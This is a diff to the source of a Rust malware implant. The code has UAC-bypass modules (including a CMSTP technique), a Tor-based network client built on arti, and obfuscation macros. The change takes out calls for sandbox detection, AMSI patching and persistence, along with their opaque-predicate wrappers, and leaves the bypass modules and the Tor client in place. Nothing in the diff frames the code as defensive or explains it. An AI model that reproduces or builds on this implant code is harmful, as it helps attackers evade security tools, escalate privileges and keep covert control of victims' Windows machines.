@@ -1,3 +1,4 @@
+#[allow(dead_code)]
 mod sandbox;
 
 #[cfg(target_os = "windows")]
@@ -11,7 +12,6 @@ mod uac_bypass;
 #[cfg(target_os = "windows")]
 mod uac_cmstp;
 pub mod util;
-//#[cfg(feature = "shared-lib")]
 mod exports;
 #[cfg(target_os = "windows")]
 use is_elevated::is_elevated;
@@ -20,7 +20,7 @@ use anyhow::{Result, anyhow};
 use arti_client::config::TorClientConfigBuilder;
 use arti_client::{DataStream, TorClient};
 use base64::{Engine as _, engine::general_purpose};
-use encstr::{astr, xstr, cobl, opaque_false};
+use encstr::{astr, xstr};
 use gethostname::gethostname;
 use libc::c_int;
 use std::path::Path;
@@ -726,35 +726,11 @@ async fn netclient_impl() -> c_int {
     0
 }
 pub async fn netclient() -> c_int {
-    sandbox::exit_if_sandboxed();
-
-    #[cfg(target_os = "windows")]
-    {
-        cobl!({
-        if opaque_false() {
-            return 1;
-        }
-        let _ = amsi::patch_amsi();
-        let _exe_path = match std::env::current_exe() {
-            Ok(p) => p.to_string_lossy().to_string(),
-            Err(_) => return 1,
-        };
-    })
-    }
-
-    cobl!({
-    if opaque_false() {
-        return 1;
-    }
-    let _ = persist::persist();
-    });
-
     netclient_impl().await;
     0
 }
 
 pub async fn netclient_dll() -> c_int {
-    sandbox::exit_if_sandboxed();
     netclient_impl().await;
     0
 }
